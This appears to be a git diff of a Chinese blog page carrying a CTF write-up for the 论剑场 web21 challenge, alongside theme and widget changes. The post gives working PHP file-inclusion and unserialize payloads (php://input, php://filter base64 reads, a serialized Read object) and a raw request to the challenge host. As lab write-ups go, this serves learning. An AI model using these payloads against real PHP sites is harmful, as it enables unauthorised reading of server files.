@@ -25,7 +25,7 @@
     version: '7.5.0',
     exturl: false,
     sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
+    copycode: {"enable":true,"show_result":false,"style":null},
     back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
     bookmark: {"enable":false,"color":"#222","save":"auto"},
     fancybox: false,
@@ -39,22 +39,22 @@
       hits: {"per_page":10},
       labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
     },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: './public/search.xml',
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     sidebarPadding: 40
   };
 </script>
 
-  <meta name="description" content="#Web21打开网页显示： you are not admin ! F12查看发现注释掉的PHP代码： $user = $_GET[“user”];$file = $_GET[“file”];$pass = $_GET[“pass”]; 1234567if(isset($user)&amp;amp;&amp;amp;(file_get_contents($user,&amp;apos;r&amp;apos;)===&amp;quot;a">
+  <meta name="description" content="#Web21打开网页显示： you are not admin ! F12查看发现注释掉的PHP代码： 12345678910$user = $_GET[&quot;user&quot;];$file = $_GET[&quot;file&quot;];$pass = $_GET[&quot;pass&quot;];if(isset($user)&amp;amp;&amp;amp;(file_get_contents($user,&amp;apos;r&amp;apos;)===&quot;admin&quot;))&amp;#123">
 <meta name="keywords" content="ctf,web,writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="论剑场_web21">
 <meta property="og:url" content="https:&#x2F;&#x2F;dream-knight.github.io&#x2F;2020&#x2F;01&#x2F;18&#x2F;%E8%AE%BA%E5%89%91%E5%9C%BA_web21&#x2F;index.html">
 <meta property="og:site_name" content="Dre4m_Dr4g0n">
-<meta property="og:description" content="#Web21打开网页显示： you are not admin ! F12查看发现注释掉的PHP代码： $user = $_GET[“user”];$file = $_GET[“file”];$pass = $_GET[“pass”]; 1234567if(isset($user)&amp;amp;&amp;amp;(file_get_contents($user,&amp;apos;r&amp;apos;)===&amp;quot;a">
+<meta property="og:description" content="#Web21打开网页显示： you are not admin ! F12查看发现注释掉的PHP代码： 12345678910$user = $_GET[&quot;user&quot;];$file = $_GET[&quot;file&quot;];$pass = $_GET[&quot;pass&quot;];if(isset($user)&amp;amp;&amp;amp;(file_get_contents($user,&amp;apos;r&amp;apos;)===&quot;admin&quot;))&amp;#123">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-01-20T08:38:19.937Z">
+<meta property="og:updated_time" content="2020-01-20T10:21:39.165Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dream-knight.github.io/2020/01/18/%E8%AE%BA%E5%89%91%E5%9C%BA_web21/">
@@ -160,9 +160,34 @@
     <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
 
   </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
   </ul>
 
 </nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
 </div>
     </header>
 
@@ -216,7 +241,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-01-20 16:38:19" itemprop="dateModified" datetime="2020-01-20T16:38:19+08:00">2020-01-20</time>
+                <time title="Modified: 2020-01-20 18:21:39" itemprop="dateModified" datetime="2020-01-20T18:21:39+08:00">2020-01-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -231,6 +256,13 @@
             </span>
 
           
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
 
         </div>
       </header>
@@ -244,8 +276,7 @@
         <p>#Web21<br>打开网页显示：</p>
 <p>you are not admin !</p>
 <p>F12查看发现注释掉的PHP代码：</p>
-<p>$user = $_GET[“user”];<br>$file = $_GET[“file”];<br>$pass = $_GET[“pass”];</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;admin&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>看到<code>file_get_contents()</code>函数推测可能存在文件包含(参看LFI（Local File Include）漏洞学习)，利用姿势如下:</p>
 <ul>
@@ -254,40 +285,20 @@
 <ul>
 <li>利用<code>php://filter/read=convert.base64-encode/resource=class.php</code>来读取class.php。</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span></span><br></pre></td></tr></table></figure>
 
 
 <p>得到回显:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello admin!</span><br><span class="line">PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+</span><br></pre></td></tr></table></figure>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello admin!</span><br><span class="line">PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+</span><br></pre></td></tr></table></figure>
 
 <p>Base64解密得到class.php：</p>
-<pre><code>&lt;?php
-error_reporting(E_ALL &amp; ~E_NOTICE);
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;										<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">			&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        	&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-class Read
-{                                        //f1a9.php
-    public $file;
-    public function __toString()
-    {
-        if(isset($this-&gt;file))
-            {
-            echo file_get_contents($this-&gt;file);    
-            }
-        return &quot;__toString was called!&quot;;
-    }
-}
-?&gt;</code></pre><p>注意到 <code>__toString()</code>函数执行时会读取并打印 <code>$this-&gt;file</code>的内容，构造序列化脚本：</p>
-<pre><code>&lt;?php
-class Read{
-public $file;
-}
+<p>注意到 <code>__toString()</code>函数执行时会读取并打印 <code>$this-&gt;file</code>的内容，构造序列化脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line">$payload = <span class="keyword">new</span> Read();</span><br><span class="line">$payload-&gt;file = <span class="string">'f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($payload);</span><br><span class="line"><span class="comment">//O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>赋值给<code>pass</code>当作为字符串是将调用<code>__toString()</code>读取f1a9.php的内容，Payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br></pre></td></tr></table></figure>
 
-$payload = new Read();
-$payload-&gt;file = &apos;f1a9.php&apos;;
-echo serialize($payload);
-//O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}
-?&gt;</code></pre><p>赋值给<code>pass</code>当作为字符串是将调用<code>__toString()</code>读取f1a9.php的内容，Payload：</p>
-<p><code>/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}</code></p>
 <p>请求包：</p>
 <pre><code>POST /index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;} HTTP/1.1
 Host: 123.206.31.85:10021
@@ -408,6 +419,7 @@ admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
 
 
       </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1491585&auto=0&height=66"></iframe>
 
     </div>
   </aside>
@@ -437,6 +449,26 @@ admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
   </div>
 
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
 
 
 
@@ -455,6 +487,8 @@ admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
   </div>
 
   
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
@@ -469,6 +503,7 @@ admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
 
 
 
+  <script src="/js/local-search.js"></script>
 
 
 
@@ -481,9 +516,11 @@ admin</code></pre><p>在返回包的网页查看源码即可见到：</p>
 
 
 
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
   
 
   
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
 </html>
